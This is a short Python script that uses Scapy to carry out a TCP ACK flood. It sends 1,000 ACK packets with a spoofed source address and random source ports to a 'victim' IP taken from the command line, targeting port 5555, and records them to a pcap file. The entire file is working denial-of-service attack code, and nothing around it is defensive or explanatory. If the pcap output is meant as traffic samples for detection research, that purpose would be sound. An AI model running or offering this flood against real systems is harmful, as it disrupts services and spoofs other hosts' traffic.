from scapy.all import *
import time
import random
import sys


def ack_flood(victim_ip, victim_port, packet_count=1000):
 packets = []
 for _ in range(packet_count):
  src_port = random.randint(1024, 65536)
  ack_packet = Ether()/IP(src="192.168.28.203", dst=victim_ip)/TCP(sport=src_port,dport=victim_port, flags="A")
  send(ack_packet)
  time.sleep(0.01)
  packets.append(ack_packet)

 wrpcap("ack_flood.pcap", packets)

if __name__ == "__main__":
 victim_ip = sys.argv[1]
 ack_flood(victim_ip, 5555, packet_count=1000)

